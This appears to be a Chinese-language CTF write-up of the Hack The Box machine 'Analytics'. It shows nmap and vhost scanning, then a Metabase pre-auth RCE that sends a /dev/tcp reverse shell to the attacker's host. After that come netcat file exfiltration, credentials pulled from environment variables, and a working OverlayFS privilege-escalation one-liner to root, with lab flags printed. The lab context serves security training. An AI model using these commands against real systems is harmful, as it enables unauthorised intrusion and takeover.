
```
┌──(root㉿kali)-[~]
└─# nmap -p- --open -Pn 10.10.11.233     
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-28 21:11 EST
Nmap scan report for 10.10.11.233
Host is up (0.33s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 84.88 seconds
                                                                                                                    
┌──(root㉿kali)-[~]
└─# nmap -sV -Pn -A 10.10.11.233 -p 22,80     
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-28 21:15 EST
Nmap scan report for 10.10.11.233
Host is up (0.36s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   231.74 ms 10.10.16.1
2   404.02 ms 10.10.11.233

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.63 seconds
                                                               
```

添加host配置
```
echo "10.10.11.233 analytical.htb" >> /etc/hosts
```

爆破vhost
```
┌──(root㉿kali)-[~]
└─# gobuster vhost -u http://analytical.htb -w /usr/share/wordlists/SecLists-2023.2/Discovery/DNS/subdomains-top1million-110000.txt --append-domain --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://analytical.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/SecLists-2023.2/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: data.analytical.htb Status: 200 [Size: 77858]

```

有一个域名，加hosts
```
echo "10.10.11.233 data.analytical.htb" >> /etc/hosts
```

web打开发现是一个metabase的cms

搜索最近的漏洞找到：[这个exp](https://github.com/m3m0o/metabase-pre-auth-rce-poc)

触发
```
┌──(root㉿kali)-[~/htb/Analytics/metabase-pre-auth-rce-poc]
└─# python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "/bin/sh -i >& /dev/tcp/10.10.16.3/443 0>&1" 
[!] BE SURE TO BE LISTENING ON THE PORT YOU DEFINED IF YOU ARE ISSUING AN COMMAND TO GET REVERSE SHELL [!]

[+] Initialized script
[+] Encoding command
[+] Making request
[+] Payload sent

```


收到rev shell
```
┌──(root㉿kali)-[~]
└─# nc -lnvp 443                         
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.233] 34962
/bin/sh: can't access tty; job control turned off
/ $ whoami
metabase
/ $ 

```



两个db文件，传送回靶机

```
/metabase.db $ ls -alh
total 3M     
drwxr-xr-x    1 metabase metabase    4.0K Aug  3  2023 .
drwxr-xr-x    1 root     root        4.0K Feb 29 02:07 ..
-rw-r--r--    1 metabase metabase    2.9M Feb 29 03:11 metabase.db.mv.db
-rw-r--r--    1 metabase metabase    6.1K Aug  3  2023 metabase.db.trace.db

```


接收文件&传送文件
```
nc -lvp 139 > metabase.db.trace.db
nc 10.10.16.3 139 < metabase.db.trace.db


nc -lvp 139 > metabase.db.mv.db
nc 10.10.16.3 139 < metabase.db.mv.db
```


使用DBeaver打开上面的 metabase.db.mv.db文件

注意这个是H2数据库，要选择2.0的版本

然后在CORE_USER表找到一条用户记录：

```
1	metalytics@analytical.htb	Johnny	Smith	$2a$10$HnyM8tXhWXhlxEtfzNJE0.z.aA6xkb5ydTRxV5uO5v7IxfoZm08LG	c50cd8da-0e37-446a-a87d-6f66f47a3334	2023-08-03 12:45:16.569	2023-08-07 11:12:12.476	true	true			true	false	false		2023-08-07 11:12:44.181			true	{"user-recent-views":"[]"}
```

但是这个哈希好像无法破解


# 环境变量
```
~ $ cat /proc/self/environ
MB_LDAP_BIND_DN=LANGUAGE=en_US:enUSER=metabaseHOSTNAME=3e8454b55552FC_LANG=en-USSHLVL=4LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../libHOME=/home/metabaseOLDPWD=/tmp/hsperfdata_metabaseMB_EMAIL_SMTP_PASSWORD=LC_CTYPE=en_US.UTF-8JAVA_VERSION=jdk-11.0.19+7LOGNAME=metabase_=/proc/self/environMB_DB_CONNECTION_URI=PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binMB_DB_PASS=MB_JETTY_HOST=0.0.0.0META_PASS=An4lytics_ds20223#LANG=en_US.UTF-8MB_LDAP_PASSWORD=SHELL=/bin/shMB_EMAIL_SMTP_USERNAME=MB_DB_USER=META_USER=metalyticsLC_ALL=en_US.UTF-8JAVA_HOME=/opt/java/openjdkPWD=/home/metabaseMB_DB_FILE=//metabase.db/metabase.db~ $ 

```

暴露出一组账号密码：
```
META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

这组密码可以登录web app（难怪破解不出来。。），也可以登录ssh

# foohold

```
┌──(root㉿kali)-[~/htb/Analytics]
└─# ssh metalytics@10.10.11.233 
The authenticity of host '10.10.11.233 (10.10.11.233)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.233' (ED25519) to the list of known hosts.
metalytics@10.10.11.233's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Feb 29 08:20:51 AM UTC 2024

  System load:              0.3095703125
  Usage of /:               94.2% of 7.78GB
  Memory usage:             29%
  Swap usage:               0%
  Processes:                250
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.233
  IPv6 address for eth0:    dead:beef::250:56ff:feb9:c874

  => / is using 94.2% of 7.78GB
  => There are 98 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Oct  3 09:14:35 2023 from 10.10.14.41
metalytics@analytics:~$ whoami
metalytics                                                                                                                      
metalytics@analytics:~$ id                                                                                                      
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics) 
metalytics@analytics:~$ cat user.txt                                                                                            
586fb68027e85004e02c79065c80869a  
```


# 提权

```
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
metalytics@analytics:~$ 
```

ubuntu版本是22.04.2

参考[这篇文章](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/)

可以用下面payload提权

```
metalytics@analytics:~$ id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
root@analytics:~# id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
root@analytics:~# cat /root/root.txt 
0ba009db23eeabab93000f8507459d5b
root@analytics:~# 

```